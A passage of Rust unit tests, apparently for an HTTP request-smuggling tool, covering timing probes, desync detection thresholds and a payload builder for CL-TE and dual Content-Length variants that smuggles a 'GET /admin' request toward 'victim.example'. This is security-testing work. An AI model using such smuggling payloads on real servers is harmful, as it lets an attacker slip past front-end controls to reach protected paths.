        let timeout_secs: u64 = 3;
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((_sock, _peer)) = listener.accept().await {
                // Hold the socket open without writing anything
                // for 10s — longer than the probe timeout.
                tokio::time::sleep(Duration::from_secs(10)).await;
            }
        });
        let elapsed = time_first_byte(
            &addr.ip().to_string(),
            addr.port(),
            b"GET / HTTP/1.1\r\nHost: x\r\n\r\n",
            timeout_secs,
        )
        .await
        .unwrap();
        let expected_ms = timeout_secs * 1000;
        assert!(
            elapsed >= expected_ms - 100,
            "should have hung ~{expected_ms}ms, got {elapsed}"
        );
        assert!(
            elapsed < expected_ms + 1500,
            "should not exceed timeout+margin, got {elapsed}"
        );
    }

    #[serial_test::serial]
    #[tokio::test]
    async fn time_first_byte_returns_quickly_when_server_responds() {
        // `#[serial_test::serial]` — binds a fresh `127.0.0.1:0`
        // listener; under Windows parallel test runs the ephemeral-
        // port + slow TIME_WAIT recycle path produces spurious
        // `connection refused` failures.
        // Spawn a TcpListener that immediately writes a minimal
        // HTTP response. Confirms the path through the success
        // case returns a small elapsed_ms.
        let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            if let Ok((mut sock, _)) = listener.accept().await {
                // Eat the request so it doesn't block our write.
                let mut buf = [0u8; 1024];
                let _ = sock.read(&mut buf).await;
                let _ = sock
                    .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
                    .await;
            }
        });
        let elapsed = time_first_byte(
            &addr.ip().to_string(),
            addr.port(),
            b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n",
            5,
        )
        .await
        .unwrap();
        assert!(
            elapsed < 4000,
            "honest server should respond fast, got {elapsed}"
        );
    }

    #[test]
    fn list_text_output_does_not_panic() {
        // Exercises the `--list` rendering path: any iteration
        // over VARIANTS that hits a None-unwrap would surface
        // here. ExitCode::SUCCESS = 0 on Unix and Windows.
        let code = run_list("text");
        // Can't easily compare ExitCode to a literal in stable
        // Rust without Termination plumbing; the smoke is enough.
        let _ = code;
    }

    #[test]
    fn list_json_format_is_accepted_by_run_list() {
        // Pre-fix: `wafrift smuggle list` had a hardcoded "text" and
        // did not accept --format. Adding ListArgs enables JSON. This
        // test pins the run_list("json") path doesn't panic.
        let code = run_list("json");
        let _ = code;
    }

    // ── unescape_prefix edge cases ────────────────────────────

    #[test]
    fn unescape_prefix_empty_string_returns_empty() {
        assert_eq!(unescape_prefix(""), "");
    }

    #[test]
    fn unescape_prefix_string_without_any_escapes_is_identity() {
        let plain = "GET / HTTP/1.1 Host x";
        assert_eq!(unescape_prefix(plain), plain);
    }

    #[test]
    fn unescape_prefix_trailing_lone_backslash_is_preserved_no_panic() {
        // The peek-after-backslash path must NOT crash on a
        // trailing backslash at end of input. P0 fuzzer would
        // immediately find this.
        let raw = "abc\\";
        assert_eq!(unescape_prefix(raw), "abc\\");
    }

    #[test]
    fn unescape_prefix_unknown_escape_is_preserved_verbatim() {
        // `\x` is not a recognised escape — keep the backslash
        // so a future reader (the smuggling engine) can tell
        // it apart from a real `x`. The current implementation
        // emits the `\\` then continues, so the result is `\x`.
        let raw = "a\\xb";
        let got = unescape_prefix(raw);
        assert!(got.contains('x'));
        assert!(got.contains('a'));
        assert!(got.contains('b'));
    }

    #[test]
    fn unescape_prefix_handles_consecutive_crlf_groups() {
        // The HTTP header terminator `\r\n\r\n` is the canonical
        // boundary — confirm two adjacent groups both unescape.
        let raw = "X\\r\\n\\r\\nY";
        assert_eq!(unescape_prefix(raw), "X\r\n\r\nY");
    }

    // ── parse_variant_name edge cases ─────────────────────────

    #[test]
    fn parse_variant_name_rejects_empty_string() {
        let r = parse_variant_name("");
        assert!(r.is_err());
    }

    #[test]
    fn parse_variant_name_does_not_match_partial_prefix() {
        // "cl" is a prefix of "cl-te" / "cl-0" but is NOT a valid
        // variant by itself. The exact-match contract must hold.
        let r = parse_variant_name("cl");
        assert!(r.is_err());
    }

    // ── classify_detection edge cases ─────────────────────────

    #[test]
    fn classify_detection_one_ms_under_threshold_does_not_fire() {
        // Boundary on the OFF side: delta == threshold - 1 must
        // stay below the desync line.
        let f = classify_detection(1699, 200, 1500); // delta = 1499
        assert!(!f.desync_inferred);
        assert_eq!(f.delta_ms, 1499);
    }

    #[test]
    fn classify_detection_handles_zero_threshold_correctly() {
        // Threshold zero with any positive delta should fire.
        // Anti-rig: a refactor that used `delta > threshold` instead
        // of `delta >= threshold` would silently flip this case.
        let f = classify_detection(201, 200, 0);
        assert!(f.desync_inferred);
        assert_eq!(f.delta_ms, 1);
    }

    #[test]
    fn classify_detection_records_threshold_in_finding() {
        // The finding carries the threshold used so operators
        // can audit the decision after the fact.
        let f = classify_detection(2000, 200, 1500);
        assert_eq!(f.threshold_ms, 1500);
    }

    // ── VARIANTS catalogue integrity ──────────────────────────

    #[test]
    fn variants_catalogue_has_no_empty_keys() {
        for v in VARIANTS {
            assert!(!v.key.is_empty(), "VARIANTS row with empty key");
        }
    }

    #[test]
    fn variants_catalogue_keys_are_unique() {
        let mut seen = std::collections::HashSet::new();
        for v in VARIANTS {
            assert!(seen.insert(v.key), "duplicate variant key {}", v.key);
        }
    }

    #[test]
    fn variants_catalogue_keys_are_lowercase() {
        // parse_variant_name lowercases input before comparing — the
        // catalogue rows MUST themselves be lowercase or the
        // case-insensitive matching is dead code.
        for v in VARIANTS {
            assert_eq!(
                v.key,
                v.key.to_ascii_lowercase(),
                "{} must be lowercase in the catalogue",
                v.key
            );
        }
    }

    // ── build_payload contract ────────────────────────────────

    #[test]
    fn build_payload_for_cl_te_includes_host_header() {
        let p = build_payload(
            VARIANTS.iter().find(|v| v.key == "cl-te").unwrap(),
            "victim.example",
            "GET /admin HTTP/1.1\r\nHost: x\r\n\r\n",
        )
        .unwrap();
        let wire = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(
            wire.contains("Host: victim.example") || wire.contains("Host:victim.example"),
            "front-request Host MUST be the target host: {wire}"
        );
    }

    #[test]
    fn build_payload_for_dual_cl_emits_two_content_length_headers() {
        let p = build_payload(
            VARIANTS.iter().find(|v| v.key == "dual-cl").unwrap(),
            "victim.example",
            "GET /admin HTTP/1.1\r\nHost: x\r\n\r\n",
        )
        .unwrap();
        let wire = std::str::from_utf8(&p.raw_bytes).unwrap();
        // Two Content-Length lines is the whole point of dual-cl;
        // a refactor that collapsed them would silently neuter
        // the attack.
        let cl_count = wire.matches("Content-Length:").count();
        assert!(
            cl_count >= 2,
            "dual-cl must emit two Content-Length headers, got {cl_count}: {wire}"
        );
    }

    #[test]
    fn build_payload_smuggled_prefix_appears_in_wire_for_cl_te() {
        // The smuggled HTTP request bytes the operator passes MUST
        // appear somewhere in the produced wire bytes — that's the
        // whole point of the attack. A refactor that dropped the
        // prefix would generate a benign request.
        let prefix = "GET /smuggled-marker HTTP/1.1\r\nHost: x\r\n\r\n";
        let p = build_payload(
            VARIANTS.iter().find(|v| v.key == "cl-te").unwrap(),
            "victim.example",
            prefix,
        )
        .unwrap();
        let wire = std::str::from_utf8(&p.raw_bytes).unwrap();
        assert!(
            wire.contains("/smuggled-marker"),
            "smuggled prefix MUST reach the wire"
        );
    }

    // F126 regression: TCP connect timeout (unreachable host, blocked
    // port) must surface as Err, NOT as a phantom-elapsed measurement
    // that gets compared against the baseline and produces a false
    // DESYNC. Aim at port 1 on localhost — Windows + most Linux
    // configs refuse it, but the connect should ERROR fast rather
    // than hang. Either way we want Err out of time_first_byte, not
    // a giant phantom Ok value.
    #[tokio::test]
    async fn time_first_byte_unreachable_returns_err_not_phantom_elapsed() {
        // Use a port reserved for "no host should listen here":
        // 1 = TCP-port-multiplexer, not in use on stock systems.
        let result = time_first_byte("127.0.0.1", 1, b"GET / HTTP/1.1\r\n\r\n", 2).await;
        match result {
            Err(msg) => {
                // Either "tcp connect: <connection refused>" (refusal)
                // OR "tcp connect: timed out after 2s" (filtered).
                // Both are the desired Err surface.
                assert!(
                    msg.starts_with("tcp connect:"),
                    "expected tcp connect error, got: {msg}"
                );
            }
            Ok(elapsed_ms) => panic!(
                "unreachable host returned phantom Ok({elapsed_ms}) ms — \
                 F126 regression: would feed into delta calculation and \
                 false-flag DESYNC"
            ),
        }
    }

    #[test]
    fn build_payload_unknown_variant_key_returns_error() {
        // We can't manufacture a VariantInfo with a bogus key
        // through normal channels, but exercise the matchable
        // wildcard arm via parse_variant_name's error path. The
        // build_payload arm is defence-in-depth.
        let bogus = VariantInfo {
            key: "made-up",
            long_name: "Made Up",
            tier: SafetyTier::Detection,
            description: "anti-rig synthetic",
        };
        let r = build_payload(&bogus, "x", "");
        assert!(r.is_err());
        assert!(r.unwrap_err().contains("made-up"));
    }
}
